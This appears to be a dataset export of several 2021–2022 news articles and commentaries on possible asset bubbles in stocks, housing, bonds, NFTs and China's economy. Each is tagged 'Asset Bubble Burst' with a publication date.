When these prices are totally divorced from stocks' underlying fundamentals, a bubble may be looming on the horizon.

Here's what's happening: During the coronavirus pandemic, record amounts of stimulus fattened the U.S. economy, flowing into the markets and consumers' pocketbooks. The Federal Reserve has been expanding its balance sheet, and that liquidity tends to get pumped into financial assets.

This has resulted in a rush of new brokerage account openings and a fresh wave of individual investors attracted to the stock market. These new investors tend to have a bullish sentiment toward stocks, leading them to purchase shares of big company names in droves. As a result, there's a bidding up of stock prices.

Furthermore, given that interest rates are low, bonds are not yielding attractive returns. There's a lot of liquidity in the market, and cash is not the best position since inflation is devaluing the dollar. In these conditions, investors see equities as a place to put some of their cash, which continues to push stocks higher.

Monetary and fiscal stimuli helped the economy recover from the pandemic, but much of that money found its way into stocks, says Steve Sosnick, chief strategist at Interactive Brokers.

Whether that love for stocks creates inflation is a matter of debate, Sosnick says. But he adds, ""I think it's clear that the first effect is creating asset price inflation. It takes more dollars to buy the same amount of shares in a given stock.""

One sector, in particular, that has driven up the value of the S&P 500 is the information technology sector. The Technology Select Sector SPDR ETF (XLK) has a one-year return of roughly 38%. As stocks in the tech sector continue to rally, it's worth asking whether these stocks are in the purview of bubble territory.

The Nasdaq large-cap tech companies such as Apple Inc. (AAPL), Amazon.com Inc. (AMZN), Microsoft Corp. (MSFT) and Facebook are ""very fully priced,"" Sosnick says. But these stocks don't necessarily constitute a bubble, he says.

""I don't know that we can continue to see these kinds of levels of multiple expansion or even maintain these current multiples if the Fed is not as relentlessly accommodative as it has been,"" Sosnick says.

Is Real Estate in a Bubble?

Real estate prices have soared throughout 2021. Many house hunters have experienced the bidding wars, rocketing prices and insane competition fetched by promising new properties. And this frenzy also applies to commercial real estate purchasing.

On the residential side, home prices have been increasing at a rapid pace and are very high compared to historical standards. Nationally, home prices increased 18% year over year in July 2021, with states such as Arizona, Idaho and Utah posting annual home price increases of more than 25%, according to CoreLogic.

The reason for this run-up in home prices is multifaceted. First, high demand is exceeding the low inventory of houses. This means there are fewer houses available for buyers looking for a home. As demand for homes increases, coupled with low supply, this puts pressure on home prices and inevitably leads to real estate asset prices increasing.

Second, the pandemic, which decimated the available workforce, delayed the building of new homes. Third, the cost of supplies needed to build homes has increased, which adds to the price of brand-new homes.

Low interest rates also make buying a home more attractive, with the cost to borrow money so low. Plus, as employees are working from home, they find they need more space. That makes moving out of the cities and into suburbs more attractive.

Most of the trends appearing today weren't caused by the pandemic, but they were accelerated by it, says Doug Prickett, senior managing director of investments and analytics at Transwestern Investment Group, a real estate investment advisor based in Dallas.

""We've been undersupplied for some time, and that's just exacerbated by the slowing supply for labor and materials to build homes,"" he says.

So are these home price increases sustainable? Or are homebuyers locking themselves into a bubble?

""There is a point where pricing exceeds the ability to service the debt and the price, and we're very close to that,"" Prickett says. ""It doesn't mean it's going to go backwards. It just means it's going to slow down.""

Given that there is a shortage in the labor market, where there are more jobs than people to fill them, employers and businesses are paying more for workers' wages.

""Inflation could help offset this increase in housing by giving us some inflation in wages, and that would allow us to service the debt we've taken on, thus not resulting in a bust,"" Prickett says.

As for what comes next, ""We've had a boom, I think we're going to hit a plateau now, and we're going to settle there for a while avoiding a bubble,"" Prickett says.

Experts are generally divided on whether we're in a boom or a bubble right now. But Prickett says, ""Everything is expensive across all asset classes now.""

Along with single-family real estate, commercial real estate has also seen an increase in value. There are two primary segments that are receiving capital in the commercial real estate space: multifamily and industrial.

""Real estate is still providing yield,"" Prickett says. ""It's also considered an inflation hedge, and instead of being evenly distributed across all sectors, it's primarily going into industrial and multifamily commercial real estate sectors.""

Are Bonds in a Bubble?

As a result of the Fed buying hundreds of billions in bonds while keeping rates low, there has been an upward trend in bond price appreciation. As interest rates have been falling, bond prices have been increasing. In other words, when yields fall, that compels investors to buy up bonds, which boosts prices.

Retirees and near-retirees may eye this bubble potential with concern. Owning bonds is part of a traditional investment portfolio. Investors tend to hold bonds for their stable and consistent returns and income, but Treasury yields are low compared with historical standards.

Another area of concern is the corporate bond market, which consists of more than $10 trillion of debt, according to the Securities Industry and Financial Markets Association. Given the low-interest-rate environment, companies are taking on cheap and sometimes highly leveraged debt.

When companies carry high debt levels, this can cause bonds to have to change their credit rating. If corporate bonds are downgraded, it could be a catalyst for a sell-off among these assets.

When the Fed announced that it would buy corporate bonds in March 2020, companies were able to raise more debt and increase their leverage. This provided a safety net for these noninvestment grade bonds, increasing investors' confidence in these risky assets, says Majeed Simaan, assistant professor of finance and financial engineering at the School of Business at Stevens Institute of Technology.

Simaan references the increase in SPDR Bloomberg Barclays High Yield Bond ETF (JNK) following the Fed's announcement.

""When the Fed announced its unprecedented policy of purchasing corporate bonds on March 23, 2020, the ETF"" jumped 32%, Simaan says. Despite the turmoil 2020 brought, the ETF finished out 2020 with a 5% gain.

Overall, Simaan says, it's difficult to say whether there is a debt bubble.",Asset Bubble Burst,2021-09-17 07:00:00

“There is a lot of uncertainty moving forward,” Walmart’s chief executive, Doug McMillon, said in a conference call with Wall Street analysts on Tuesday.
Wall Street had been expecting that torrid consumer demand would have to slow at some point.","A chaotic day on Wall Street extended the longest period of market turmoil since 2001, with stocks on Friday briefly descending into bear market territory, a symbolic marker of investors’ deep pessimism about the health of the global economy and the buying power of the American consumer.

The S&P 500 has fallen for seven consecutive weeks, its worst stretch since the dot-com bubble burst more than two decades ago. After a 3 percent drop this week, the index is down 14 percent since early April.

Friday afternoon, the S&P 500 crossed the bear market threshold of a 20 percent decline from its peak on Jan. 3. But with less than 30 minutes left before trading ended, after hours of churn and a drop of as much as 2.3 percent, the market rallied and ended a hair above where it had started the day.

That was little consolation for investors, many of whom have grown accustomed to years of robust returns and have never seen a market upheaval like this.

With this week’s relentless slide and Friday’s wild swing was a constant worry on Wall Street that rising inflation, compounded by the war in Ukraine, might tip the economy into a recession. At the heart of those fears was fresh evidence reported this week from retailers like Walmart and Target that rising costs were now hitting corporate America.

During the darkest days of the pandemic, the American economy was propelled by consumers. Even as the costs of goods, transportation and labor increased, companies were able to pocket record profits by raising prices, confident that people would continue buying. But this week brought indications that some consumers may have reached their limit, and profits have started to shrink.

“What the companies are telling us is that they are starting to notice that their consumer is responding to inflation,” said Jay Sole, a retail analyst at UBS. “We were worried about this moment and we were waiting for this moment, and now it’s here.”

Recessions have often followed bear markets, though one does not necessarily cause the other. A bear market occurred in the early days of the coronavirus pandemic, but it was the shortest on record, lasting just 33 days before stocks began to rally. Less than six months later, the S&P 500 began hitting new highs again, climbing 42 percent above its prepandemic level before starting to slide in January. Now the index is down more than 18 percent from its high point.

Friday’s turbulent trading came after months of investors fretting about how serious and long-lasting inflation would be and how aggressively the Federal Reserve would have to raise rates to slow the rising cost of living.

James Bullard, the president of the Federal Reserve Bank of St. Louis, said during an interview on Fox Business on Friday that raising interest rates by half a point at coming central bank meetings was “a good plan for now.”

Mr. Bullard struck a relatively unconcerned tone about markets, despite the day’s volatility.

“You would expect with the Fed raising rates, that all of these assets — trillions of dollars worldwide — would have to be repriced,” Mr. Bullard said.

What set this week apart was a grim earnings report on Tuesday from Walmart, the nation’s largest retailer, which confirmed many investors’ worst fears about inflation.

For the first time in many years, Walmart said its quarterly profits had fallen, a sign to many analysts that the retailer could not pass along many of its rising costs to consumers without risking a slowdown in sales. Target and Kohl’s also said quarterly profits had plunged, adding to Wall Street’s unease.

Walmart said that some of its customers were buying less-expensive meats and other food items as costs soared, and that sales of certain discretionary goods like clothing had slowed, as budget-conscious shoppers focused instead on buying necessities like groceries. The company’s executives said they saw no signs of inflation starting to abate.

“There is a lot of uncertainty moving forward,” Walmart’s chief executive, Doug McMillon, said in a conference call with Wall Street analysts on Tuesday. “Things are very fluid.”

Globally, investors can find little comfort. The Russian invasion of Ukraine and the response from other countries has disrupted crucial supplies of energy, wheat and other staples. Poor countries face a gathering catastrophe over hunger and debt.

Janet L. Yellen, the Treasury secretary, said high food and energy prices were creating “stagflationary effects” — the combination of high inflation and a stagnating economy. China’s economy, the world’s second-largest after that of the United States, is laboring under the government’s strict pandemic lockdowns. Before the war in Ukraine and Covid’s resurgence in China, the International Monetary Fund was projecting global growth of 4.4 percent this year. Now its forecast is 3.6 percent.

Wall Street had been expecting that torrid consumer demand would have to slow at some point. Government stimulus checks that provided Americans with billions in spending money during the pandemic stopped long ago. The hope of both the Trump and Biden administrations was that the economy could eventually be weaned off the stimulus and that consumer demand would stay relatively strong.

But inflation, which has risen faster and remained more persistent than many investors and even the Fed initially expected, has thrown the recovery into doubt.

Unemployment is approaching the lowest rate in decades, and the economy has regained nearly 95 percent of the 22 million jobs lost at the height of coronavirus lockdowns. Average hourly earnings in the U.S. rose 5.5 percent in the year through April, but many of those gains are being eroded by inflation. Over that same period, prices rose 8.3 percent.

“The government just turbocharged the economy, and we were partying on buying goods,” said Scott Mushkin, the founder of R5 Capital, a retail-focused consulting and financial research firm. “People wondered what the hangover would be like. We have never seen anything like this.”

To be sure, some retailers said that not every consumer was pulling back or shifting spending. Walmart said better-off shoppers continued to spend freely on bigger-ticket items like patio furniture, and Target said it was not seeing a broad retreat in spending, either. Home Depot, which has benefited from a pandemic remodeling boom, said it was seeing no big slowdown in business.

But Mr. Sole of UBS worries that if prices continue to climb, higher-income consumers will eventually shift their spending, too.

“Right now, lower-income consumers are feeling inflation more acutely,” he said. “The worry is, what if it affects all income and demographic groups?”

For months, the mixed signals have been confounding Wall Street as it tries to forecast future profits and how high interest rates will climb.

The current conditions are also confusing to even the most experienced executives, who are finding it difficult to plan their inventory and staffing. Walmart, which is known for successfully navigating the last period of persistently high inflation, in the 1970s, acknowledged this week that it had too many employees in the first quarter and that it had not anticipated how rapidly the increase in gasoline prices would inflate costs in its supply chain. The company’s 25 percent decline in profit from the previous year was a big surprise to analysts.

“If these companies can’t handle this, it tells you something really unusual is afoot,” Mr. Mushkin said.

The S&P 500 is currently down more than 17% since January, and it also briefly entered bear market territory recently.

Market downturns can be intimidating, and even experienced investors are often unnerved by volatility. Also, because nobody knows for certain whether a crash is looming, it's normal to feel concerned about the market's future.

Just how worried about a market crash should you be, though? And what should you be doing to protect your investments? There are a few things to know.

Is the stock market going to crash?

Nobody can say for sure how the market will perform in the coming weeks or months. While there is a chance that stock prices could continue falling, it's also possible that the market recovers relatively quickly.

Rather than trying to predict the market's performance or worrying about whether a crash is looming, the best thing you can do right now is maintain a long-term outlook.

The market has seen plenty of corrections and crashes over the years. In the past two decades alone, it's experienced everything from the dot-com bubble burst to the Great Recession to the crash in the early stages of the COVID-19 pandemic. Not only has it recovered from every downturn so far, but it's also earned positive average returns over time.

If you're worried about a potential stock market crash, keep in mind that investing is a long-term game. No matter what happens over the coming weeks or months, it's extremely likely the market will rebound eventually.

How to protect your money

Whether the stock market crashes or not, there are steps you can take to protect your investments as much as possible.

For one, make sure your portfolio is well-diversified. Most experts recommend owning at least 25 to 30 stocks from a variety of industries. This way, even if one or two of your stocks don't survive a market downturn, it won't have a major impact on the rest of your portfolio.

Next, double-check your asset allocation -- especially if you're close to retirement. As you age, it's wise to gradually shift your portfolio to the conservative side, investing less in stocks and more in bonds. If you expect to need your money in the next few years, investing more conservatively can reduce the impact of volatility and keep your savings safer.

Finally, ensure that every stock in your portfolio is a solid long-term investment. Healthy companies are more likely to rebound from downturns. If you have a portfolio full of strong stocks, your investments have a much better chance of surviving even the worst market crashes.

Market volatility can be nerve-wracking, even for experienced investors. But by taking steps to protect your investments, choosing the right stocks, and holding those stocks for the long term despite volatility, you can rest easier knowing your money is as safe as possible.",Asset Bubble Burst,2022-05-25 07:00:00

Across the western world, the inflation rate is at a multi-decade high.

At the onset of the Covid-19 pandemic, stock markets collapsed. Whether it was the FTSE 100, S&P 500, the DAX, S&P ASX 200, the CAC 40, they were all hit the same. The month of March 2020 saw each of these internationally tracked indexes lose around 30% of their value. Governments panicked and turned on the quantitative easing taps. Interest rates, already low, were reduced to just above 0%. And this hyper-relaxed monetary policy has seen every asset class bubble up, across the UK, Euro Zone, Australia, and New Zealand. But in the USA, it appears that the situation could be about to get markedly worse.

This ‘bubble of everything’ can only end in one of two ways. Either assets will plateau for a significant length of time, allowing wages and the real economy to catch up. Or the bubble is going to pop. But as the economic damage would be disastrous, the Federal Reserve will delay the pop as much as possible. And in the long run, that could make the situation worse if the bubble eventually bursts.

The bubble of everything

GDP growth slowed from 6.7% in Q2 2021, to 2.1% in Q3, ‘led by a slowdown in consumer spending. In 2020, GDP fell by 3.5%, the first time it’s fallen since the credit crunch of 2009. However, the problem is that inflation in November hit 6.8% according to the US Consumer Prices Index.

And in times of high inflation, a central bank’s most powerful tool is to raise the currency’s base interest rate. However, this makes debt more expensive, restricting the ability of companies to grow. And this is precisely the quandary the US’s Federal Reserve finds itself in. Federal Reserve Chair Jerome Powell recently said it is time to ‘retire’ the word ‘transitory’ to describe inflation, paving the way to increase the ‘tapering’ of the US’s quantitative easing program, and potentially raise the base rate in 2022. The program has already added $4.5 trillion to the Reserve’s balance sheet. While it is expected to end by mid-2022, a faster taper along with a rate rise could be the catalyst for a market crash.

Disposable income collapse

US inflation is at its highest level since 1982. But for 44.7 million Americans, there’s a bigger problem about to hit their personal finances. The moratorium on student loan payments, collections and interest, which was introduced at the beginning of the pandemic, is coming to an end on 31 January 2022.

In the UK, plan 2 graduates currently pay back 9% of any income earned over £27,295pa towards their student loans. While this can amount to a significant sum over a lifetime of repayments, their burden pales in comparison with the debt facing US graduates, who together owe a whopping $1.86 trillion.

The UK system is unfair to some graduates. Median-earning graduates pay back more money over their working lives, compared to higher and lower earners. However, one key advantage over the US system is that there are no repayments due if a graduate’s income remains below the repayment threshold. With the US system, the debt is treated like commercial debt and must be paid regardless of income. And the Student Debt Crisis Centre has found that 89% of US graduates are not financially secure enough to restart payments next year.

The average debt per graduate is $30,000, while the average interest rate is 5.8%. This means the typical US graduate is accruing $1,740 of interest each year, with compound interest on top. Meanwhile, the Consumer Confidence Index decreased in November, from 111.6 points in October to 109.5 in November. With inflation rocketing, a cost-of-living crisis could be about to hit America’s middle class soon.

Then there’s the housing crisis to consider. Often viewed as the main marker for consumer confidence, an over-bloated housing market could be the first bubble to burst. Like the UK, the mass take-up of homeworking has led to a ‘race for space,’ and the results have seen prices rocket. CoreLogic’s Home Price Index shows that between October 2020 and October 2021, the price of the average US home went up 18%, which is the largest increase in 45 years.

However, 51% of the period’s mortgage applications were made by millennials, aged between 26 and 41, who are more likely to be first time buyers with a small deposit at high risk of negative equity in a downturn. Economists at Fannie May believe the median price of a previously owned home will hit $400,000 by the end of 2023. The median wage in the US is $34,248.45 per year. It’s not hard to see what could go wrong if interest rates rise.",Asset Bubble Burst,2021-12-12 08:00:00

This just keeps getting worse: Applications for mortgages to purchase a home dropped 7% for the week, and were down 21% from a year ago, the Mortgage Bankers Association reported today. An indicator of future home sales: Potential homebuyers try to get pre-approved for a mortgage, lock in a mortgage rate, and then start house-hunting.

Mortgage rates have soared this year, and home prices have soared for years to ridiculous levels, causing layers and layers of potential buyers to abandon the market, amid “worsening affordability challenges,” as the MBA called it. And these applications to purchase a home hit the lowest point since the depth of the lockdown in April 2020 (data via Investing.com):

The MBA’s Purchase Mortgage Applications Index has now dropped below the lows of late 2018. By November 2018, the Fed had been hiking rates for years (slowly), and its QT was in full swing, and mortgage rates had edged above 5%, which was enough to begin shaking up the housing market. Home sales volume slowed, prices began to come down in some markets, and stocks were selling off. But with inflation below the Fed’s target, and with Trump, who’d taken ownership of the Dow, constantly throwing darts at Powell, the Fed signaled in December 2018 that it would cave, and instantly mortgage rates began to fall, and volume and prices took off again.

Today, raging inflation is the #1 economic issue, and the Fed is chasing after it, with backing from the White House, and so this issue in the housing market is just going to have to play out.

Holy-Moly Mortgage Rates.

The average 30-year fixed mortgage rate with conforming balances and 20% down rose to 5.40% this week, according to the MBA today, having been in this 5.4% range, plus or minus a little, since the end of April, the highest since 2009.

I call them holy-moly mortgage rates because that’s the reaction you get when you apply this rate to figure a mortgage payment for a home at current prices and then accidentally look at the resulting mortgage payment (data via Investing.com):

“Bad time to buy a home.”

Turns out, sky-high home prices to be financed with holy-moly mortgage rates, plus uncertainty about the economy, dropping stock prices, and inflation eating everyone’s lunch make a toxic mix for homebuyers.

The percentage of people who said that now is a “bad time to buy” a home jumped to 79%, another record-worst in the data going back to 2010, according to Fannie Mae’s National Housing Survey for May. Sentiment has been deteriorating since February 2021:

“Consumers’ expectations that their personal financial situations will worsen over the next year reached an all-time high in the May survey, and they expressed greater concern about job security,” according to Fannie Mae’s report.

“These results suggest to us that increased mortgage rates, high home prices, and inflation will likely continue to squeeze would-be homebuyers – as well as those potential sellers with lower, locked-in mortgage rates – out of the market, supporting our forecast that home sales will slow meaningfully through the rest of this year and into next,” said Fannie Mae.

Sagging stock prices keep getting blamed.

The stock market is on the front pages every day. Only a small percentage of Americans own any significant amount of equities, but that doesn’t matter. Stock market declines, with many high-flying stocks plunging 70% or 80% or even 90% since February 2021, have rattled a lot of nerves. Which is in part why Fannie Mae pointed out, “consumers’ expectations that their personal financial situations will worsen over the next year reached an all-time high.”

The MBA also had previously pointed at the financial markets as one of the reasons for the plunge in purchase mortgage applications.

In the tech and social media sector, the big declines in stock prices have now triggered the first hiring freezes and a few layoffs. And this too – just the idea of nirvana being somehow over – is shaking up some folks.

Sharp increases in stock portfolios, stock options from employers, or cryptos empowered potential homebuyers and enabled many to borrow against their portfolios to come up with down payments. This option has either vanished or is looking very shaky for many.

Refi applications collapsed to lowest since year 2000.

Applications for mortgages to refinance an existing mortgage dropped another 6% for the week, and have collapsed by 75% from a year ago, to the lowest level since the year 2000, according to the MBA’s Refinance Mortgage Applications Index. The MBA obtains this data from a weekly survey of mortgage bankers.

With these holy-moly mortgage rates, just about the only reason to refinance is to extract cash from the home via a cash-out refi (data via Investing.com):

Cash-Out Refi mortgage applications.

According to the AEI Housing Center, which tracks mortgage applications by the number of rate locks, no-cash-out refi applications have collapsed by 92% from a year ago. But cash-out refi applications are primarily driven by the desire to extract cash from a home, with mortgage rates being a secondary issue – and so they continue but a slower pace.

Cash out refi applications in week through May 30 (black line) plunged by 42% from the same week in 2021 and have stabilized roughly level with 2019:

A cash-out refi provides a big lump sum for the homeowner to spend on all kinds of things, from cars to home improvement projects. They are also used to pay off high-cost debts, such as credit cards so that these credit cards can then be used for more purchases. The plunge in cash-out refi reduces the availability of these lump-sums, and therefore reduces the stimulus to the economy they provide.

No-cash-out refi mortgages at lower mortgage rates also boost consumer spending, as the lower rates reduce payments that then leave some extra every month to spend on other stuff. But the spike in mortgage rates, and the subsequent 92% collapse of no-cash-out refi mortgage applications ends this program.

As a result, investments made by a number of NFT owners are now worth much less than when they had bought them.

The NFT of the first tweet by Twitter Co-Founder Jack Dorsey on the micro-blogging site was first auctioned for $2.9 million to Sina Estavi, CEO of Malaysia-based blockchain company Bridge Oracle, in March 2021. But when Estavi put it up for auction again earlier this year, he did not receive any bid above $14,000. Estavi did not sell the NFT, The Wall Street Journal reported.

Similarly, in early April, another NFT buyer had bought Doggy #4292, a Snoop Dogg curated NFT, for about $32,000 worth of the cryptocurrency ether. The asset was up for auction later with an asking price of $25.5 million. By May 3, the NFT had received the highest bid of 0.0743 ether, or about $210.

Why are NFTs crashing?

Last week, some of the most popular NFTs witnessed a fall of 30-50 percent in US dollar terms, Business Standard reported. This was because NFTs are quoted in Ethereum, which itself witnessed a sharp fall.

The value of an NFT is derived from either utility or sentimentality, Gaurav Somwanshi, blockchain entrepreneur and CEO of EmerTech Innovations, told Business Standard. Those deriving value from sentimentality are bought with the hope of further trading, which inflates the price, Somwanshi explained.

According to Somwanshi, the market is witnessing a filtering of NFTs, in which a number of digital assets will lose their value, while some with utility or artistic value will hold their ground.

Zach Friedman, Co-Founder of crypto brokerage Secure Digital Markets, echoed the thought, saying some perk or utility makes NFTs stand out.

“The ones that continue will be utility-focused for sure,” Friedman told The Wall Street Journal.

“If we can’t increase consumption, this year’s economic growth will be very challenging,” he said in March (link in Chinese).","Chinese economists and officials are sounding alarm bells over the state of the country’s stalling economy.

Widespread pandemic lockdowns in key cities and manufacturing regions this year have roiled supply chains and weighed on growth. Businesses are struggling. Data released today paint a dire picture: China’s industrial output and retail sales for April are both down sharply, and unemployment is climbing. Retail contracted by 11.1% from a year earlier, a far deeper plunge than the 6.1% drop forecast by Reuters.

For a government whose legitimacy is heavily dependent on sustained economic growth, this presents a major headache. The question is, will Beijing manage to deploy the right tools to rev up its economy?

“Save the economy at all costs. Hand out money.”

So far, Beijing has rolled out a series of supply-side measures to give the economy a boost. These include massive tax cuts and rebates totaling 2.5 trillion yuan ($400 billion); cutting banks’ reserve requirement ratios; going “all out” on infrastructure investment; and business-friendly policies like fee reductions, financial insurance, and expedited customs clearance procedures.

But one set of economic tools is conspicuously missing: demand-side policies. That is, policies designed to boost demand for goods and services, which in turn drives economic growth.

“Save the economy at all costs. Hand out money,” urged Peking University’s Huang Yiping (link in Chinese), speaking at an economics conference an economics conference this weekend. Huang’s phrase intentionally echoed that of former European Central Bank president Mario Draghi, who in 2012 pledged to do “whatever it takes” to save the euro.

China has long had very weak consumer demand. Among major economies, Chinese households have one of the lowest consumption shares of GDP. This is a function of China’s high-savings model of economic development, which favors government and business investment at the expense of ordinary people’s spending, as Matthew Klein of the Overshoot and Michael Pettis of Peking University explain in their book Trade Wars are Class Wars.

Pandemic lockdowns have weakened household consumption even further. Workers lost income and jobs. People likely saved more in the face of uncertainty. And citizens locked in their apartments for weeks have been unable to spend, except on food—and sometimes not even that.

Prominent Chinese economists have in recent weeks called for measures to boost consumption.

“We have to boost domestic consumption since investment is constrained by the declining expectation on the demand side,” argues Peking University economist Yao Yang. “…I insist on what I have been calling for these two years — giving the people cash to promote consumption.”

Though a handful of Chinese cities have handed out consumption vouchers, there has been no coordinated nationwide campaign.

In fact, premier Li Keqiang all but ruled out cash handouts in a speech late last month. While handouts might be “fair and effective,” he said (link in Chinese), they are unsuited for China because doing so would exacerbate inequality given the uneven development across regions.

Others disagree. Li Xunlei, chief economist at brokerage Zhongtai Securities, says the government should hand out 1,000 yuan ($150) each to China’s population of 1.4 billion. “Consumption vouchers should be issued by the central government … the sooner [they] are issued, the better,” Li said in an interview last month (link in Chinese).

Huang, of Peking University, says the stakes are high. “If we can’t increase consumption, this year’s economic growth will be very challenging,” he said in March (link in Chinese). “…We have to hand out money to the people.”

Demand-side policies could be politically dicey

But a one-off cash handout would only be the first step towards boosting consumer spending.

The more challenging task is to rebalance its entire economy from a reliance on investments and exports to being a consumption-led economy. Beijing has a buzzword for this rebalancing: pursuing “high-quality growth.”

Boosting consumption by increasing the household share of GDP, however, means transferring income from those who’ve long had more of it—governments and businesses—to individual citizens. That’s a politically fraught task, as Pettis argues.

Meanwhile, the flip side of the very low share of GDP retained by Chinese households is the extraordinarily high levels of investment spending, principally on infrastructure and real estate.

But one can invest too much, making it unproductive: think of the “ghost towns” full of empty apartment blocks. Or as Peking University’s Yao put it: “after more than 20 years of high-speed development of infrastructure, local governments can find fewer and fewer good projects.”

Excessively high levels of investment coupled with weak consumer demand is a problem that Japan faced, too. When Japan’s asset bubble burst in 1992, what followed was not a meltdown but decades of stagnation. And there’s another similarity: both Japan and China are aging and shrinking.

Unless China can deploy demand-side policies at scale and radically transform its growth model to prioritize consumption, it may well follow Japan’s path of decades of slow growth.",Asset Bubble Burst,2022-05-16 07:00:00

And it’s a pretty juicy question posed to 21 economic luminaries — “on a scale of one to 10, what are the risks of a bursting asset bubble?”

Jeffrey Frankel of Harvard University responded with a nine. He cited four examples of where he sees “egregious” bubble behavior — in cryptocurrencies like bitcoin BTCUSD, -13.91% , the run-up in videogames retailer GameStop’s GME, -9.23% stock, the phenomenon of non-fungible tokens and the boom in special-purpose acquisition companies, which he compared to the infamous South Sea Bubble.

Former Austrian central bank chief Ewald Nowotny also was in the nine camp, worried about real estate as well as what he called “excessive risk-taking in a great number of markets and the growing importance of poorly regulated non-bank financial intermediaries.” Nowotny also noted leveraged loan financing that has fed a fast-growing, high-yield market with many aspects of excessive leverage and liquidity mismatches.

Not all the economists were worried. Joseph Gagnon, senior fellow at the Peterson Institute for International Economics, rated the risk at just a two. He argued that neither bonds, equity, nor real estate markets greatly exceed their fundamental value. While expensive by historical standards, Gagnon said aging work forces, declining population growth and weak productivity growth have pushed real interest rates to record low levels.

Thomas Mayer, the former chief economist of Deutsche Bank and the founding director of the Flossbach von Storch Research Institute, rated the risks just a three. Mayer said low interest rates are raising asset valuations, and excess cash balances have induced portfolio reallocation. But since central banks are in Mayer’s words “prisoners” to fiscal policymakers and financial markets, he assigns a low probability to a meaningful tightening of monetary policy.

Robert Litan, non-resident senior fellow at the Brookings Institution, rated the risk at five. He was skeptical that the rise in inflation will be sustained and trigger Federal Reserve tightening. Besides, he adds, how much macroeconomic damage would be caused even if asset prices do suddenly fall? This time around, the asset-price runups are not debt driven, and bank capital cushions are much thicker. He said any asset-price fall would damage the economy like the mild downturn after the dot-com bubble burst, though the high levels of government debt relative to the size of the economy will make cleaning up after the next mess more difficult.",Asset Bubble Burst,2021-07-21 07:00:00

Today, at a time that the world is experiencing an “everything” asset price and credit market bubble that is very much more pervasive than was the U.S. housing and credit market bubble of the previous decade, the world’s major central banks are still keeping their pedal to the monetary policy metal. Today, at a time that the world’s central banks keep adding froth to the world’s asset and credit markets by their ultra-easy monetary policies, there is a deafening silence from the academic community about the risks of another central bank-induced painful boom-bust cycle.

The primary source of today’s global “everything” asset price and credit market bubble is the maintenance of zero policy interest rates and the unprecedentedly aggressive bond-buying activity by the world’s major central banks.

Whereas, in the wake of the September 2008 Lehman bankruptcy, it took Ben Bernanke six years to increase the size of the Federal Reserve’s balance sheet by $4 trillion, in the wake of the coronavirus pandemic it has taken Jerome Powell less than a year to do the same thing. Not to be outdone, over the past year, Christine Lagarde’s European Central Bank has increased the size of its balance sheet from less than $5 trillion before the pandemic to its current level of around $9.5 trillion.

One way in which the unprecedentedly rapid pace of central bank money printing has manifested itself has been a global equity price bubble. As an example, today U.S. equity valuations, as measured by the Shiller Cyclically Adjusted Price Earnings ratio, are more than double their historic average. They are also at very lofty levels that have been surpassed only once in the past one hundred years.

Another manifestation of rapid money printing has been housing market bubbles around the world. This has included a U.S. housing bubble, where house prices today in real terms are at a level similar to those in 2006 at the peak of the previous housing market cycle.

More disturbing yet for world financial market stability are the pervasive global credit market bubbles that have been spawned by today’s ultra-easy monetary policies.

Despite their record-high public debt levels and their highly compromised budgets in the wake of the pandemic, the emerging market economies have still been able to borrow vast amounts of money at relatively attractive interest rates. Similarly, despite having its highest public debt level in its 150-year history, the Italian government has still been able to borrow at a lower interest rate than the U.S. government can. Meanwhile, in a world flush with liquidity, both U.S. and European corporates with the worst credit quality have been able to continue borrowing at relatively low-interest rate spreads.

The common factor that keeps fueling these asset price and credit market bubbles is the belief that interest rates will remain at their currently very low rates forever. At a time that budget policy has become excessively expansive and now threatens inflation, this creates an acute policy dilemma for the Federal Reserve.

If the Fed chooses to raise interest rates and taper its bond-buying program, then it risks bursting the global “everything” asset price bubble that could be problematic for the United States and world financial system as it was in 2009. On the other hand, if the Fed does not rein in its ultra-loose monetary policy, it risks allowing price inflation to take hold and asset markets to become even more frothy than they are today. That, in turn, would all too likely set us up for an even harder landing down the road than had the Fed acted in a timely manner.

For the country’s sake, one must hope that painful as it might be, the Fed starts tightening its ultra-loose policy sooner rather than later. By doing so, it will at least heighten the chances that the U.S. economy will avoid a nasty burst in inflation and have a softer landing than it would have if the Fed were to stick to its currently ultra-loose monetary policy stance.

“My pushback on it is what’s driving the growth in housing prices is the lack of inventory,” he said.
“Our evidence points to abnormal U.S. housing market behavior for the first time since the boom of the early 2000s,” researchers wrote.","The nation’s home prices have skyrocketed, shattered records and continued upward with no real plateau in sight. But now some national researchers and economists are warning they are seeing signs of a housing bubble brewing.

It’s not the same as the last housing bubble that preceded the market crash and global financial crisis in 2007 and 2008.

“However, there is growing concern that U.S. house prices are again becoming unhinged from fundamentals,” researchers and economists at the Federal Reserve Bank of Dallas wrote in a blog post published Tuesday.

Until recently, experts haven’t widely supported the possibility of a housing bubble about to burst, especially in states like Utah, where demand continues to woefully outpace supply despite record price increases.

But now, federal researchers are warning of “abnormal” U.S. market behavior that points to signs of a U.S. housing bubble — though they don’t predict if or when it would pop.

But there is some good news.

“We argue that the underlying causes of the run-up differ from those during the last housing boom” that preceded the Great Recession, researchers wrote.

If you’re thinking about the global economic crisis that followed the 2007 bubble burst, researchers said there’s “no expectation that fallout from a housing correction would be comparable” to that crash “in terms of magnitude or macroeconomic gravity.”

“Among other things, household balance sheets appear in better shape, and excessive borrowing doesn’t appear to be fueling the housing market boom,” researchers wrote.

Importantly, they added, experience from the housing bubble and the Great Recession led to development of “advanced tools for early detection and deployment of warning indicators.” That means “market participants, banks, policymakers and regulators are all better equipped to assess in real time the significance of a housing boom,” they wrote.

“Thus, they are in a more informed position to react quickly and avoid the most severe, negative consequences of a housing correction.”

The researchers said they used a real-time market monitoring statistical tool kit for assessing the health of the U.S., in partnership with “networks of scholars from around the world” collaborating under the International Housing Observatory. The methodology, they wrote, uses “novel statistical methods to continuously monitor housing markets ... to detect symptoms and signal the presence of emerging housing booms.”

What does this mean for Utah’s housing market?

Dejan Eskic, senior research fellow at the University of Utah’s Kem C. Gardner Policy Institute who specializes in housing research, told the Deseret News on Thursday that Utahns shouldn’t panic or jump to hasty conclusions from the new report.

He said the typical understanding of a “bubble” — or what Americans saw in 2008 — is not the same as what’s happening in today’s market, where there continues to be a real demand in housing, especially in Western states like Utah.

“My pushback on it is what’s driving the growth in housing prices is the lack of inventory,” he said.

In the 2000s, when the U.S. had overbuilt housing and there was a subprime mortgage crisis depicted in such films as “The Big Short,” Eskic said “everybody and their dog was getting mortgages.”

Today, Eskic said, it’s not easy to get a home loan.

